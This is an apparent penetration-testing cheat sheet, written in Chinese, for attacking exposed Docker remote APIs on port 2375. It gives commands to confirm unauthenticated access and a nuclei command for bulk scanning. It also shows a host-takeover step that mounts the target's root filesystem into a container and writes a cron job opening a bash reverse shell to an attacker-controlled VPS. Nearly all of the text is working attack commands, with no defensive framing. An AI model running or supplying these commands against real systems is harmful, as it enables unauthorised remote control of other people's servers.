# 2375 Docker

## 未授权访问

```bash
HOST=; PORT=2375; # TARGET HOST INFO
```

```bash
curl $HOST:$PORT/version
curl $HOST:$PORT/info
docker -H tcp://$HOST:$PORT images
docker -H tcp://$HOST:$PORT container
```

### 批量检测未授权访问

```bash
nuclei -t ~/nuclei-templates/http/misconfiguration/exposed-docker-api.yaml -l hosts-port.txt
```

* [\~/nuclei-templates/http/misconfiguration/exposed-docker-api.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/exposed-docker-api.yaml)

## 容器逃逸

```bash
HOST=; PORT=2375; # TARGET HOST INFO
```

```bash
# 使用目标主机的 Docker 创建容器
docker -H tcp://$HOST:$PORT run -it -v /:/mnt nginx:latest --name nginx-test /bin/bash
# 没有网络的话可以尝试加上 --network host
# IN CONTAINER
HOST=; PORT=6789; # VPS INFO
echo "* * * * * root /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1 > /mnt/etc/cron.d/reverse_shell
```
